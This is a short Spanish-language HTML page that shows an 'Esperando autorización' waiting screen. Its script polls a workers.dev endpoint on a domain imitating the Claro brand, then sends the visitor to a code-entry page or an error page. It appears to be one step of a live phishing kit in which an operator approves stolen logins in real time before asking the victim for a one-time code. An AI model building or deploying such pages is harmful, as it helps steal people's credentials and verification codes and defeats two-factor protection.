<h2>Ingresando...</h2>
<p id="status">Esperando autorización...</p>

<script>
const checkInterval = 3000;
const statusEl = document.getElementById("status");
const id = localStorage.getItem("login_id"); // Guardar el id después del submit

async function checkAuth() {
  try {
    const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${id}`);
    const data = await res.json();

    if(data.autorizado) {
      window.location.href = "codigo.html";
    } else if(data.error) {
      window.location.href = "usererror.html";
    } else {
      statusEl.textContent = "Esperando autorización...";
    }
  } catch(err) {
    console.error(err);
    statusEl.textContent = "Error al conectar al servidor.";
  }
}

setInterval(checkAuth, checkInterval);
</script>
